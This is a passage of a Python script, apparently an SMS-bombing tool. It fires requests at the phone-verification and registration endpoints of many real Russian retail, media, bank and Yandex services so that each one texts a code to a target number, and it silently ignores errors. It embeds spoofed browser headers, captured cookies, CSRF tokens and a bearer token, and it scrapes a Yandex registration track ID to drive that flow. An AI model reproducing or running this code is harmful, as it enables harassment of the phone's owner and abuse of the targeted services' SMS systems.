E%22%3A%22aaaa%22%2C%22GROUP%22%3A%22B%22%7D%2C%22vmeste_pokupayut%22%3A%7B%22ID%22%3A%228431927%22%2C%22NAME%22%3A%22vmeste_pokupayut%22%2C%22GROUP%22%3A%22%22%7D%2C%22services%22%3A%7B%22ID%22%3A%228468431%22%2C%22NAME%22%3A%22services%22%2C%22GROUP%22%3A%22A%22%7D%2C%22quickview%22%3A%7B%22ID%22%3A%228477065%22%2C%22NAME%22%3A%22quickview%22%2C%22GROUP%22%3A%22%22%7D%2C%22search_source2%22%3A%7B%22ID%22%3A%228494465%22%2C%22NAME%22%3A%22search_source2%22%2C%22GROUP%22%3A%22B%22%7D%2C%22quotas_sku%22%3A%7B%22ID%22%3A%228522979%22%2C%22NAME%22%3A%22quotas_sku%22%2C%22GROUP%22%3A%22A%22%7D%2C%22anyquery%22%3A%7B%22ID%22%3A%228525703%22%2C%22NAME%22%3A%22anyquery%22%2C%22GROUP%22%3A%22A%22%7D%2C%22video_listing%22%3A%7B%22ID%22%3A%228540227%22%2C%22NAME%22%3A%22video_listing%22%2C%22GROUP%22%3A%22%22%7D%2C%22cartpopap%22%3A%7B%22ID%22%3A%228544915%22%2C%22NAME%22%3A%22cartpopap%22%2C%22GROUP%22%3A%22A%22%7D%2C%22setka%22%3A%7B%22ID%22%3A%228631141%22%2C%22NAME%22%3A%22setka%22%2C%22GROUP%22%3A%22%22%7D%2C%22main1%22%3A%7B%22ID%22%3A%228631187%22%2C%22NAME%22%3A%22main1%22%2C%22GROUP%22%3A%22%22%7D%2C%22smart_filters%22%3A%7B%22ID%22%3A%228642223%22%2C%22NAME%22%3A%22smart_filters%22%2C%22GROUP%22%3A%22A%22%7D%2C%22new_billing%22%3A%7B%22ID%22%3A%228696669%22%2C%22NAME%22%3A%22new_billing%22%2C%22GROUP%22%3A%22%22%7D%7D; iwaf_fingerprint=b62d832f832ca2f3a46d73d451f7c01c; BITRIX_SM_CUR_ORDER_IDS=%5B%5D; _userGUID=0:la60x5ua:NQzvC6tZbv06owYT6N6nmMMxszutU6My; _dvs=0:la60x5ua:9X~~8h5zYnLQNb6_GMWGIxHPvOJXo9sY; iwaf_click_event=115x319',
                'origin': 'https://hoff.ru',
                'referer': 'https://hoff.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {
                'phone': num2,
                "g-recaptcha-response": {}
            }

            requests.post('https://hoff.ru/vue/register/', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '101',
                'Content-type': 'application/vnd.api+json',
                'Cookie': 'guid_city=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; name_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; guid_region=0c5b2444-70a0-4932-980c-b4dc0d3f02b5; guid_country=8aa15da9-92a4-4530-ab74-1992c973c539; region_timezone=UTC%2B3%3A00; ab-test-user-id=b81234b62c57e7db8f97bb8c5aae7d2dc5a20488c38e1f6963ee8a14a3356f7da%3A2%3A%7Bi%3A0%3Bs%3A15%3A%22ab-test-user-id%22%3Bi%3A1%3Bs%3A32%3A%22933133d1ca8f2277c2dbc5671647b30d%22%3B%7D; fuser_id=400a9f05c3d4eea2e6a463167ceffc5a9113a569cfa9a16392484053b87bfcaaa%3A2%3A%7Bi%3A0%3Bs%3A8%3A%22fuser_id%22%3Bi%3A1%3Bs%3A32%3A%2224e973c408cc57099eac88d53ad12205%22%3B%7D; PHPSESSID=0hd82290tod529ln49unqlitke; _csrf=ab463b1a39cb814c72899b49f7e46e245f5ca7b88de51eda4075fd2da58abc93a%3A2%3A%7Bi%3A0%3Bs%3A5%3A%22_csrf%22%3Bi%3A1%3Bs%3A32%3A%22-qTZJe5FI0mRe2WzkLYoSlrqTgr4wVOJ%22%3B%7D; inova_p_sid=qol791i_221109090955; windowDate=2022%2011%2009',
                'Host': 'sokolov.ru',
                'Origin': 'https://sokolov.ru',
                'Referer': 'https://sokolov.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user
            }

            payload = {"data":{"type":"login","attributes":{"phone":number,"uid_captcha":None,"code_captcha":None}}}

            requests.post('https://sokolov.ru/api/v4/profile/user/send-code', json=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'bx-ajax': 'true',
                'content-length': '100',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'BITRIX_SM_SALE_UID=31225761; BITRIX_SM_EVRAZ_CURRENT_LOC_ID=93; BITRIX_SM_EVRAZ_SEND_GEO_LOCATION_REQUEST=Y; operator=0; authorization=0; BITRIX_SM_EVRAZ_LOC_ID=93; BITRIX_SM_EVRAZ_LOC_CITY_NAME=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; BITRIX_SM_EVRAZ_CITY=%D0%A1%D0%B0%D0%BD%D0%BA%D1%82-%D0%9F%D0%B5%D1%82%D0%B5%D1%80%D0%B1%D1%83%D1%80%D0%B3; mindboxDeviceUUID=163d88b7-873b-47e8-8156-0cab2973c9f1; directCrm-session=%7B%22deviceGuid%22%3A%22163d88b7-873b-47e8-8156-0cab2973c9f1%22%7D; popmechanic_sbjs_migrations=popmechanic_1418474375998%3D1%7C%7C%7C1471519752600%3D1%7C%7C%7C1471519752605%3D1; PHPSESSID=7ImV2jMdTgrjFbH1FR4KT9JlWMhfjUz5; BITRIX_SM_EVRAZ_LAST_IP_V2=151.106.12.246',
                'origin': 'https://spb.evraz.market',
                'referer': 'https://spb.evraz.market/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-bitrix-csrf-token': 'e13afe9718f81a6518cbaa0bda8979e3'
            }

            payload = {
                'userPhone': num2,
                'captchaCode': '',
                'captchaWord': '',
                'sessid': 'e13afe9718f81a6518cbaa0bda8979e3'
            }

            requests.post(
                'https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms',
                data=payload, headers=header)
        except:
            pass
        try:
            payload = {"data": {"type": "requestSMS", "attributes": {"phone": "+" + number}}}

            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '68',
                'Content-Type': 'application/json',
                'Cookie': 'xid=f977bd6a-7555-4825-8c30-2f80517a7c81; catalogGender=women; uuid=84513f80-afe7-4390-b9ab-cbef7219cdc9; siteVer=1.0.0; _slfs=1668014274236; _slid=636be0af01b07254b104fe53; _slsession=06C229F2-EBA7-43B8-BE6D-ED83E1A61A4E; actual-checkout-type=cart; gtmc_userAuth=0; __zzatw-tsum=MDA0dC0cTApcfEJcdGswPi17CT4VHThHKHIzd2VfRGwkGXtfUEBcUn4qFhV/bShMDz5ePT5vMTE7ah5meGBSS1Y/dRdZRkE2XBpLdWUJCzowJS0xViR8SylEW1MJJRoVeXIoVg0QVy8QLj9hTixcIggWEU0hF0ZaFXtDPGMMcRVNfX0mNGd/ImUrOVURCBISIGNVWml1WQhDThgSPV8qWFcMNHhlEENYfXFrL2R7RSRfHDx1ZS8zaWVpcC9gIBIlEU0hF0ZaFXtDLGAMcRVcQ0d1cyo/ZyRkTl8nP0ccOmlRJD4yXhA8dWUJCzowJS0xZid8Syk1HREyXldVNDtnQXt1IHJ+FDllDFcnHXgdYngqIg==H7n1MA==; wishlist_sid=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_release=19257c11ea8e8373036b532c32b28dc6458b591b; gtmc_city=%D0%A1%D1%82%D1%80%D0%B0%D1%81%D0%B1%D1%83%D1%80%D0%B3; gtmc_region=null; gtmc_country=%D0%A4%D1%80%D0%B0%D0%BD%D1%86%D0%B8%D1%8F; x-wishlist-sid-local=kNvw-umbO4vBn8GUbN3D3m8Maq684e8z; gtmc_cart=%7B%22cnt%22%3A%5B%5D%2C%22id%22%3A%5B%5D%2C%22cd6%22%3A%5B%5D%7D; gssc213163=; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; cfidsw-tsum=dsZFD7+B/2p9PMHHJNQqYExT6T5U4qNwihY5lBkV0eUzJU1q7C2PrWqNuqIwCpyXPxlqjuW3jfERBYUVyww8SQCyVjhYxN/EjD0ErEjNEwOovrydI+AOGc6L7I9WID7Jm2p1vvfA4Qa7qtcn8PyLhmJGCjKTPqPnSm/C; gsscw-tsum=dJzFkoZnrNwUdl/mSDzQo81riC8qq0GIsZzhPoLf0pZbmGjgRYPcM0QWcCFS7kRNN1aHi7mPHqeUa0A3H9gCx77HRnAF9GCMKyoeoR/wxTE2cjEVVe1BRX45yL//NylMoPtcS7YG1Qk9Nr47WK5l+plq0NMS1PeKrSRLRtgMuqcuMW8KQJArwzF1EBHLsSr9he4hueRZ55gl/DHmCBHWblQMRKQJP4gdDB2bpqReQMdRJQPf5OJSqXSR+X7Gyo6s5rwRHPY43wDGgmRx2uxB; fgsscw-tsum=HM2a24aeaad3ebe9f3acf27c1860f9e7d6769237',
                'Host': 'api.tsum.ru',
                'Origin': 'https://www.tsum.ru',
                'Referer': 'https://www.tsum.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user,
                'X-Client-Date': '09.11.2022, 18:18:06',
                'X-Site-Region': 'RU',
                'X-Uid': '84513f80-afe7-4390-b9ab-cbef7219cdc9',
                'X-XID': 'f977bd6a-7555-4825-8c30-2f80517a7c81'
            }

            requests.post('https://api.tsum.ru/v2/authorize/request-sms', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '51',
                'Content-Type': 'application/json',
                'Cookie': 'SessionID=baMlJmKhzoYnXn2NFKHNsQuF0hUrwWnKpjcm5VLEkVU',
                'Host': 'bmp.megafon.tv',
                'Origin': 'https://megafon.tv',
                'Referer': 'https://megafon.tv/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {
                'msisdn': "+" + number,
                'password': "200147200147"
            }

            requests.post('https://bmp.megafon.tv/api/v10/auth/register/msisdn', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '107',
                'content-Type': 'application/json',
                'Cookie': 'suid=69c5eebce8dd622b0c61536c8880755b.bbb938e4d6d90b9ea4f49bd33d6b9228; autoru_sid=a%3Ag636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca%7C1668014724703.604800.tb-QtFaltosbNGBHFhXuUw.PIb8E2rWYxc1npgvR-99UIXOd3VYt8YlJqswR1Yd1nM; autoruuid=g636be2842qn56nfnrvce1paem2ph581.1e6a0abd44cad0e79c8e9472449946ca; autoru_gdpr=1; spravka=dD0xNjY4MDE0NzQwO2k9MTUxLjEwNi4xMi4yNDY7RD1DMzVBNEZGODRDMDg4OTU3MkRGOTREMEFCRTM5M0NBOTE2N0JFRjBENzU0QTIwRTgwODM2OTE4NEFFMUI1MTFEQzE3N0FDQjk7dT0xNjY4MDE0NzQwNjg1ODYyNjQyO2g9YTU5NDM0N2U1ZGMyYWEwZmZlZTUzMGQ1YzFlYjQ0YTU=; _yasc=BfGUGpXLHtiBxKt6L6s4IsWKTSltQon0caSV3VQUM02jgcteHq6J+3znIWK0; _csrf_token=99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                'Host': 'auth.auto.ru',
                'Origin': 'https://auth.auto.ru',
                'Referer': 'https://auth.auto.ru/login/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'x-csrf-token': '99d7b5be3d19e4c301314bbc99ebfe4f59c6fd942c82865f',
                'x-requested-with': 'XMLHttpRequest'
            }

            payload = {"items":[{"path":"auth/login-or-register","params":{"phone":number,"retpath":"https://auto.ru/"}}]}

            requests.post('https://auth.auto.ru/-/ajax/auth/', json=payload, headers=header )
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            r = requests.get(
                'https://passport.yandex.ru/registration?retpath=https%3A%2F%2Fsso.passport.yandex.ru%2Fprepare%3Fuuid%3D2b4f2f34-4209-48dc-9fbc-a387c073dcfd%26goal%3Dhttps%253A%252F%252Fya.ru%252F%26finish%3Dhttps%253A%252F%252Fpassport.yandex.ru%252F&process_uuid=fdb2fdab-53b3-4b8c-b4ee-7208186098dc',
                headers=header)

            str1 = str(r.text)
            str2 = str1[str1.find('name="track_id"'):]
            str3 = str2.replace('name="track_id" value="', '')
            str4 = ''

            for i in range(len(str3)):
                str4 += str3[i]
                if str3[i] == '"':
                    break

            str4 = str4[:-1]

            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '183',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'track_id': str4,
                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                'password': 'Hoho_HO123',
                'login': 'korotkovateng1987-qw',
                'phone_number': number
            }

            requests.post('https://passport.yandex.ru/registration-validations/password', data=payload,
                          headers=header)

            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '174',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Cookie': 'yandexuid=4238775361667427470; yuidss=4238775361667427470; i=iwBU4dLllApgR5zO7x6NMHzwa4lW+qL+AFenI96QJ+49STguLe/J4hzdyp+Zrn+fZ6mJi2kZG+SqL+g6zw9yBDzFolQ=; ymex=1982787470.yrts.1667427470#1982787470.yrtsi.1667427470; uniqueuid=378561771668018560; _yasc=vrm8+veH/z5e9Zs1+cHxwy76ekSBmkVGwxBYwKATO1VvAOGMnHX9XKcQYAc/wYk=',
                'Host': 'passport.yandex.ru',
                'Origin': 'https://passport.yandex.ru',
                'Referer': 'https://passport.yandex.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-origin',
                'User-Agent': user,
                'X-Requested-With': 'XMLHttpRequest'
            }

            payload = {
                'track_id': str4,
                'csrf_token': '964346147709db41c197808a04486455c1113df0:1668018564963',
                'number': number,
                'isCodeWithFormat': True,
                'confirm_method': 'by_sms'
            }

            requests.post('https://passport.yandex.ru/registration-validations/phone-confirm-code-submit',
                          data=payload, headers=header)
        except:
            pass
        try:
            num2 = "+7 ({0}{1}{2}) {3}{4}{5}-{6}{7}-{8}{9}".format(*number)

            header = {
                'accept': '*/*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '30',
                'content-type': 'application/json',
                'cookie': 'session-cookie=17260499d0a105e4f60c6a976940ac722a0bdfce508c35fd9f493dec44a7d64568a8eab2240c8fdcb7be0fdc1af6f059; XSRF-TOKEN=eyJpdiI6InFHdU9UWno4bUwxUmJvR0hrMkR1S0E9PSIsInZhbHVlIjoiTmpwZ3pkUHQyNy80RmhBd0VuelYwYmczcS9FTThWNmZoRE1GM2YyOS83bmdXV3JETEZGekRIdkxNdFZxc3JrWUFIbWdHMWRFVWh1UmJCaDJUc1JWNk1oUVY5QlI1SlZkTzVFcERuY295NnhPQU5paGZJS2RvUnk3VmFPYlNvQVUiLCJtYWMiOiI5NjdmYzhlZjllOTEwYjUxMzRjMjY3M2RkZTM3MGRiMmYyZjk3MGZkYTk4OGZmMzE2MjEzMDJhYjMzYjRiYjQ1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6ImxtUXFGVmRPM2J4WUtBR3hmUWJjUUE9PSIsInZhbHVlIjoiUFNNZ09yN0wvVGp2dGxnVDhVbUNlLzA3TEE0bDVPejAvZWJNK281TXB2ays4WGt6cEtIWXZvWVgyUXdtcnNKMnNaR2RQbCtYUGFBYjM4MzRRVUlMWWxaalNzcUhTaTBid3lkdHlVa1BINnVsNkd1TFRMQkQ2RERBbDFQZm9VZHkiLCJtYWMiOiIyMGYzOWI0Y2FhMjFiMmI3NzgwNGJhNGYzY2ZhOGMxNGE3YzdmOTJhNDM5NmNkMDFhZGM5NWNhM2M3YmZmNzk5IiwidGFnIjoiIn0%3D; font=phone',
                'origin': 'https://oauth.av.ru',
                'referer': 'https://oauth.av.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user,
                'x-ajax-token': 'd1a800da997269b58decc9ce6d66d3840e02801ae84265c99251a9a040a83830',
                'x-csrf-token': 'RsR9OkeQqAMcPyunXg8LdUV75QAIBGHDFWjU9PTZ',
                'x-requested-with': 'XMLHttpRequest',
                'x-xsrf-token': 'eyJpdiI6InFHdU9UWno4bUwxUmJvR0hrMkR1S0E9PSIsInZhbHVlIjoiTmpwZ3pkUHQyNy80RmhBd0VuelYwYmczcS9FTThWNmZoRE1GM2YyOS83bmdXV3JETEZGekRIdkxNdFZxc3JrWUFIbWdHMWRFVWh1UmJCaDJUc1JWNk1oUVY5QlI1SlZkTzVFcERuY295NnhPQU5paGZJS2RvUnk3VmFPYlNvQVUiLCJtYWMiOiI5NjdmYzhlZjllOTEwYjUxMzRjMjY3M2RkZTM3MGRiMmYyZjk3MGZkYTk4OGZmMzE2MjEzMDJhYjMzYjRiYjQ1IiwidGFnIjoiIn0='
            }

            payload = {
                'phone': num2
            }

            requests.post('https://oauth.av.ru/check-phone', json=payload, headers=header )
        except:
            pass
        try:
            header = {
                'accept': 'application/json, text/plain, */*',
                'accept-encoding': 'gzip, deflate, br',
                'accept-language': 'fr-FR,fr',
                'content-length': '69',
                'content-type': 'application/x-www-form-urlencoded',
                'cookie': 'anonymous-consents=%5B%5D; abtc=787EC619484F2A7B4C166802604530920674; abtc-text-button_2=default_text; abtc-story-test_5=story_exist; abtc-checkout-button_2=active_button; abtc-crm-test_3=owm_crm; abtc-fast-buy-listing_1=fast_buy_listing; cookie-notification=NOT_ACCEPTED; ROUTE=.accstorefront-cbd86fdb8-r9fqp; AKA_A2=A; akaas_sn_www_shoppinglive_ru=2147483647~rv=14~id=02330a70b8ea956d92b323dd5a0c4036~rn=Traffic%20Shift%20RU%20clone%201; userWasLogin=true; JSESSIONID=9296AB25A1624615EB76E2B2065219A5.accstorefront-cbd86fdb8-r9fqp; exp_id=default_text/fast_buy_listing/story_exist/active_button/owm_crm; sl-cart=2d001440-4742-42b0-a799-97ec1f86ea05',
                'origin': 'https://www.shoppinglive.ru',
                'referer': 'https://www.shoppinglive.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': user
            }

            payload = {
                'mobilePhone': number[1:],
                'CSRFToken': '00bc3ff8-f081-483d-ab0e-bb026785114f'
            }

            requests.post('https://www.shoppinglive.ru/phone-verification/send-code', data=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/plain, */*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': '__ddg1_=xl7dki0N0qhMTlUiS9iY; deviceId=d8e3d55a4da157282898a72208499cfd; token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIzODFlYzZlZi1hOGFmLTQ5NDgtYmFjYS01NDliM2ZjZTg1N2QiLCJhbm9ueW1vdXMiOiJUcnVlIiwic2lkIjoiNTVkOGFlMTAtODYxZi00NGI0LWFmMzEtZjMwYmYxNjk1YjgyIiwiZGV2aWNlaWQiOiJkOGUzZDU1YTRkYTE1NzI4Mjg5OGE3MjIwODQ5OWNmZCIsInR5cGUiOiJBY2Nlc3MiLCJleHAiOjE2NjgwMzM5MjQsImlzcyI6ImFwLmxlb21heC5ydSIsImF1ZCI6ImFwLmxlb21heC5ydSJ9.qME5o3Qh4sNNv-3iQ0sxaH5KKWoXlukGXq63q6QfVt8',
                'Host': 'ap.leomax.ru',
                'Origin': 'https://auth.k8s.leomax.ru',
                'Referer': 'https://auth.k8s.leomax.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {"phone": "+"+number}

            requests.post('https://ap.leomax.ru/siteapi/auth/authcode', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': 'application/json, text/javascript, */*; q=0.01',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '24',
                'Content-Type': 'application/json',
                'Cookie': 'mobile=false; device=pc; geo_site=www; geo_region_url=www; site_city=%D0%9C%D0%BE%D1%81%D0%BA%D0%B2%D0%B0; site_city_id=2; APPLICATION_CONTEXT_CITY=21; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2022-11-09%2021%3A48%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2022-11-09%2021%3A48%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Macintosh%3B%20Intel%20Mac%20OS%20X%2012_2_1%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36; _ga=GA1.2.1662387916.1668026888; _gid=GA1.2.811000822.1668026888; _gat=1; sbjs_session=pgs%3D2%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.raiffeisen.ru%2F',
                'Host': 'oapi.raiffeisen.ru',
                'Origin': 'https://www.raiffeisen.ru',
                'Referer': 'https://www.raiffeisen.ru/',
                'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", ";Not A Brand";v="99"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"macOS"',
                'Sec-Fetch-Dest': 'empty',
                'Sec-Fetch-Mode': 'cors',
                'Sec-Fetch-Site': 'same-site',
                'User-Agent': user
            }

            payload = {
                'number': number
            }

            requests.post('https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms', json=payload, headers=header)
        except:
            pass
        try:
            header = {
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate, br',
                'Accept-Language': 'fr-FR,fr',
                'Connection': 'keep-alive',
                'Content-Length': '75',
                'Content-type': 'application/json',
